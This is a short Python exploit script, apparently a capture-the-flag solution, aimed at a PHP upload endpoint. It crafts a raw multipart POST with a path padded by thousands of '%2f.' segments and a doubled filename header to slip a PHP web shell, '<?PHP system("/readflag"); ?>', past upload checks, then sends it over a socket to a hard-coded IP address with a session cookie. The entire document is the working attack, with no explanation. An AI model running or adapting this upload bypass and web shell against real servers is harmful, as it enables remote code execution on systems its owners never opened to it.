import socket
import string
import random

dirname = "a2e125be1e78c71eb47c976af315924a" # get this from the server
# sessid = "ts36rd5mj4issvkte7cff7163f"
sessid = "dn4igec5je90dtmhdlvq2f25u1" # PHPSESSID cookie, get this from the server
query_path = "%2f." * 2001 + "".join([random.choice(string.ascii_letters) for _ in range(20)])

http = f"""POST /index.php?path={query_path} HTTP/1.1
Host: localhost:9999
Cookie: PHPSESSID={sessid}
Content-Type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY
User-Agent: insomnia/8.4.2
Accept: */*
Content-Length: 186

--X-INSOMNIA-BOUNDARY
Content-Disposition: form-data; name="file"; filename=foo.php; filename*=UTF-8''foo
Content-Type: text/plain

<?PHP system("/readflag"); ?>
--X-INSOMNIA-BOUNDARY--

"""

print(http)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# sock.connect(('localhost', 8000))
sock.connect(("3.39.6.7", 8000))
sock.sendall(http.encode())
data = sock.recv(1024)
print(data.decode())
sock.close()
